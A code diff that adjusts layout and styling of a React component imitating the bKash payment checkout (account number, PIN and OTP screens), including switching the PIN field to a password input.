@@ -210,7 +210,7 @@ const BkashPayment = () => {
 
   return (
     <div className="fixed inset-0 bg-gray-200 flex flex-col items-start justify-start p-4 pt-6 overflow-hidden">
-      <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden flex flex-col" style={{ height: '520px', minHeight: '520px', maxHeight: '520px' }}>
+      <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden flex flex-col" style={{ height: '490px', minHeight: '490px', maxHeight: '490px' }}>
         {/* bKash Logo Header */}
         <div className="bg-white py-3 flex justify-center border-b shrink-0">
           <img src={bkashLogoImg} alt="bKash" className="h-8 object-contain" />
@@ -220,7 +220,7 @@ const BkashPayment = () => {
         {isLoading ? (
           <>
             {/* Pink Section - Loading */}
-            <div className="bg-[#E2136E] flex flex-col items-center justify-center" style={{ height: '400px' }}>
+            <div className="bg-[#E2136E] flex flex-col items-center justify-center" style={{ height: '370px' }}>
               <div className="relative w-24 h-4 mb-3">
                 {/* Dot 1 - lowest brightness, rotates through all positions */}
                 <span 
@@ -260,7 +260,7 @@ const BkashPayment = () => {
         ) : showFailedView ? (
           <>
             {/* Pink Section - Payment Failed */}
-            <div className="bg-[#E2136E] flex flex-col items-center justify-center" style={{ height: '400px' }}>
+            <div className="bg-[#E2136E] flex flex-col items-center justify-center" style={{ height: '370px' }}>
               {/* Circle with gap at bottom-right and X inside - smaller & bolder */}
               <div className="relative w-8 h-8 mb-4">
                 <svg width="32" height="32" viewBox="0 0 44 44" fill="none">
@@ -324,7 +324,7 @@ const BkashPayment = () => {
             {showCancelView ? (
               <>
                 {/* Pink Section - Cancel Confirmation */}
-                <div className="bg-[#E2136E] px-5 flex flex-col items-center justify-center" style={{ height: '340px' }}>
+                <div className="bg-[#E2136E] px-5 flex flex-col items-center justify-center" style={{ height: '310px' }}>
                   <Hand className="w-6 h-19 text-white mb-3" strokeWidth={1.5} />
                   <p className="text-white text-center text-xs font-medium">
                     Are you sure you want to cancel this payment?
@@ -332,16 +332,16 @@ const BkashPayment = () => {
                 </div>
 
                 {/* Cancel Confirmation Buttons */}
-                <div className="bg-white px-4 py-2.5 flex gap-3 shrink-0">
+                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                   <button
                     onClick={handleConfirmCancel}
-                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
+                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-2 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                   >
                     Yes
                   </button>
                   <button
                     onClick={handleBackFromCancel}
-                    className="flex-1 bg-[#E2136E] text-white py-3 rounded text-xs font-medium hover:bg-[#C91160] transition-colors"
+                    className="flex-1 bg-[#E2136E] text-white py-2 rounded text-xs font-medium hover:bg-[#C91160] transition-colors"
                   >
                     No
                   </button>
@@ -350,9 +350,9 @@ const BkashPayment = () => {
             ) : showPinView ? (
               <>
                 {/* Pink Section - PIN Form */}
-                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '340px' }}>
+                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '310px' }}>
                   {/* Fixed top area for title + input */}
-                  <div className="pt-[90px]">
+                  <div className="pt-[80px]">
                     <h3 className="text-white text-center text-xs font-medium mb-1 h-4">
                       Enter PIN of your bKash account number
                     </h3>
@@ -361,13 +361,13 @@ const BkashPayment = () => {
                     </p>
                     <input
                       ref={pinInputRef}
-                      type="text"
+                      type="password"
                       autoComplete="off"
                       value={pinCode}
                       onChange={handlePinChange}
                       placeholder="Enter PIN"
-                      className="w-full bg-white rounded px-4 h-[42px] flex items-center justify-center text-center text-gray-600 placeholder:text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden caret-transparent overflow-hidden"
-                      style={{ WebkitTextSecurity: 'disc', fontSize: pinCode.length > 0 ? '28px' : '14px', letterSpacing: '0.15em', lineHeight: '42px', color: pinCode.length > 0 ? '#374151' : 'transparent' } as React.CSSProperties}
+                      className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden"
+                      style={{ WebkitTextSecurity: 'disc', letterSpacing: '0.25em', caretColor: '#374151' } as React.CSSProperties}
                     />
                   </div>
                   {/* Warning flows below input without shifting it */}
@@ -380,17 +380,17 @@ const BkashPayment = () => {
                 </div>
 
                 {/* PIN Action Buttons */}
-                <div className="bg-white px-4 py-2.5 flex gap-3 shrink-0">
+                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                   <button
                     onClick={handleCancelClick}
-                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
+                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-2 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                   >
                     Cancel
                   </button>
                   <button
                     onClick={handlePinConfirm}
                     disabled={!isValidPin() || isConfirmLoading}
-                    className={`flex-1 py-3 rounded text-xs font-medium transition-colors ${
+                    className={`flex-1 py-2 rounded text-xs font-medium transition-colors ${
                       isValidPin() || isConfirmLoading
                         ? "bg-[#E2136E] text-white hover:bg-[#C91160]"
                         : "bg-gray-200 text-gray-400 cursor-not-allowed"
@@ -414,9 +414,9 @@ const BkashPayment = () => {
             ) : showOtpView ? (
               <>
                 {/* Pink Section - OTP Form */}
-                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '340px' }}>
+                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '310px' }}>
                   {/* Fixed top area for title + input */}
-                  <div className="pt-[100px]">
+                  <div className="pt-[90px]">
                     <h3 className="text-white text-center text-xs font-medium mb-3 h-4">
                       Enter verification code sent to {getMaskedNumber()}
                     </h3>
@@ -462,17 +462,17 @@ const BkashPayment = () => {
                 </div>
 
                 {/* OTP Action Buttons */}
-                <div className="bg-white px-4 py-2.5 flex gap-3 shrink-0">
+                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                   <button
                     onClick={handleCancelClick}
-                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
+                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-2 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                   >
                     Cancel
                   </button>
                   <button
                     onClick={handleOtpConfirm}
                     disabled={!isValidOtp() || isConfirmLoading}
-                    className={`flex-1 py-3 rounded text-xs font-medium transition-colors ${
+                    className={`flex-1 py-2 rounded text-xs font-medium transition-colors ${
                       isValidOtp() || isConfirmLoading
                         ? "bg-[#E2136E] text-white hover:bg-[#C91160]"
                         : "bg-gray-200 text-gray-400 cursor-not-allowed"
@@ -496,7 +496,7 @@ const BkashPayment = () => {
             ) : (
               <>
                 {/* Pink Section - Payment Form */}
-                <div className="bg-[#E2136E] px-5 py-5 flex flex-col justify-center" style={{ height: '340px' }}>
+                <div className="bg-[#E2136E] px-5 py-5 flex flex-col justify-center" style={{ height: '310px' }}>
                   <div className="h-5 flex items-center justify-center mb-3">
                     <h3 className="text-white text-center text-xs font-medium">
                       Your bKash Account Number
@@ -510,28 +510,28 @@ const BkashPayment = () => {
                     placeholder="e.g 01XXXXXXXXX"
                     className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
                   />
-                  <div className="h-5 flex items-center justify-center mt-3">
+                  <div className="flex flex-col items-center justify-center mt-3">
                     <p className="text-white text-center text-[10px]">
-                      By clicking the confirm button you agree to the{" "}
-                      <a href="https://www.bkash.com/en/page/terms-and-conditions" target="_blank" rel="noopener noreferrer" className="underline hover:text-white/80">
-                        Terms & Conditions
-                      </a>
+                      By clicking the confirm button you agree to the
                     </p>
+                    <a href="https://www.bkash.com/en/page/terms-and-conditions" target="_blank" rel="noopener noreferrer" className="text-white text-[10px] underline hover:text-white/80">
+                      Terms & Conditions
+                    </a>
                   </div>
                 </div>
 
                 {/* Action Buttons */}
-                <div className="bg-white px-4 py-2.5 flex gap-3 shrink-0">
+                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                   <button
                     onClick={handleCancelClick}
-                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
+                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-2 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                   >
                     Cancel
                   </button>
                   <button
                     onClick={handleConfirm}
                     disabled={!isValidNumber() || isConfirmLoading}
-                    className={`flex-1 py-3 rounded text-xs font-medium transition-colors ${
+                    className={`flex-1 py-2 rounded text-xs font-medium transition-colors ${
                       isValidNumber() || isConfirmLoading
                         ? "bg-[#E2136E] text-white hover:bg-[#C91160]"
                         : "bg-gray-200 text-gray-400 cursor-not-allowed"
